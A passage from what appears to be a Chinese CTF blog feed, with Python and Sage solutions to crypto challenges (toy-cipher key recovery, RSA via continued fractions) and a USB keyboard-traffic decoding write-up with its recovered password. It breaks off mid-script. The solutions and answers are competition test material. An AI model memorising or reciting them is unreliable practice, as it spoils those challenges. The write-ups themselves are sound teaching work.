class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>            partial_candidate_key = [<span class="hljs-string">&#x27;*&#x27;</span>] * <span class="hljs-number">20</span> <span class="hljs-comment"># 为2的倍数，多次尝试20得到key</span><br>            partial_candidate_key[pos] = c<br>            partial_candidate_key[<span class="hljs-number">19</span> - pos] = c<br>            key = <span class="hljs-string">&quot;&quot;</span>.join(partial_candidate_key)<br>            res = encrypt(known_prefix, key, key[::-<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> res[pos] == ciphertex[pos]:<br>                final_key[pos] = c<br>                final_key[<span class="hljs-number">19</span> - pos] = c<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(final_key))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(final_key)<br><br>known = <span class="hljs-string">&#x27;flag&#123;ISEC-&#x27;</span><br>cipher = <span class="hljs-string">&#x27;6JnsNxHKJ8mkvhS&#123;rMO_c9apMfHDHObq80PMu&#123;_ww_r&#123;rq&#x27;</span><br>key = <span class="hljs-string">&quot;glFgFtudARRAdutFgFlg&quot;</span><br><br><span class="hljs-built_in">print</span>(recover_key(known,cipher))<br><span class="hljs-built_in">print</span>(decrypt(cipher,key[::-<span class="hljs-number">1</span>],key))<br></code></pre></td></tr></table></figure><h4 id="Crypto1"><a href="#Crypto1" class="headerlink" title="Crypto1"></a>Crypto1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">--/---/.-./..././..--.-/-.-./---/-.././..--.-/..-./..-/-./-./-.--<br>解摩斯转小写<br>morse_code_funny<br></code></pre></td></tr></table></figure><p>连分数展开得到num1和num2，然后常规解rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># sage</span><br><br>data3 = <span class="hljs-number">1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956</span><br><br>c = continued_fraction(data3)<br><br>alist = c.convergents()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alist:<br>    a = <span class="hljs-built_in">str</span>(i).split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)&gt;<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> gcd(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>])) == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> is_prime(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>])) <span class="hljs-keyword">and</span> is_prime(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>])) <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>]).bit_length()==<span class="hljs-number">512</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>]).bit_length()==<span class="hljs-number">512</span>:<br>        <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment"># [&#x27;11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693&#x27;, &#x27;9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517&#x27;]</span><br><br>n12=[<span class="hljs-number">11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693</span>, <span class="hljs-number">9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517</span>]<br><br>leak = <span class="hljs-number">23213363443983005040318061737977092634638640953366787443691593387275645092922646169818923792205696350020369122807136306157118385984272980615310163206933078119776935167207473544453080959202803743994251355133953187110546017667004996272367137522351606700447920805532616096125523674597551449412004735397779511371</span><br><br>PHI = (n12[<span class="hljs-number">0</span>]-<span class="hljs-number">1</span>)*(n12[<span class="hljs-number">1</span>]-<span class="hljs-number">1</span>)<br>p_qd = <span class="hljs-built_in">pow</span>(n12[<span class="hljs-number">0</span>],-<span class="hljs-number">1</span>,PHI)<br>p_q = <span class="hljs-built_in">pow</span>(leak,p_qd,n12[<span class="hljs-number">0</span>]*n12[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(p_q)<br><br>var(<span class="hljs-string">&quot;p,q&quot;</span>)<br><br>ct = <span class="hljs-number">31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393</span><br>N = <span class="hljs-number">61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673</span><br><br>res = solve([N-p*q,p-q-p_q],[p,q],solution_dict=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>][p])<br><span class="hljs-built_in">print</span>(res[<span class="hljs-number">0</span>][q])<br>p = res[<span class="hljs-number">0</span>][p]<br>q = res[<span class="hljs-number">0</span>][q]<br><br>d = <span class="hljs-built_in">pow</span>(<span class="hljs-number">65537</span>,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(ct,d,N)<br>mm = m - n12[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(mm)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一些USB流量分析</title>
    <link href="/2023/09/23/USB%E6%B5%81%E9%87%8F/"/>
    <url>/2023/09/23/USB%E6%B5%81%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>这里记一下碰到的一些USB的流量分析）</p><h2 id="2023-“华为杯”第二届中国研究生网络安全创新大赛"><a href="#2023-“华为杯”第二届中国研究生网络安全创新大赛" class="headerlink" title="2023 “华为杯”第二届中国研究生网络安全创新大赛"></a>2023 “华为杯”第二届中国研究生网络安全创新大赛</h2><h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>对usb.pcpang常规键盘分析一条龙</p><p><code>tshark -r usb.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#这里是加号冒号的数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>得到解压包密码</p><p><code>!@#qwer123_DASCTF_okok</code></p><p>根据题目信息 观察流量包 端口均为0123</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scapy.<span class="hljs-built_in">all</span> <span 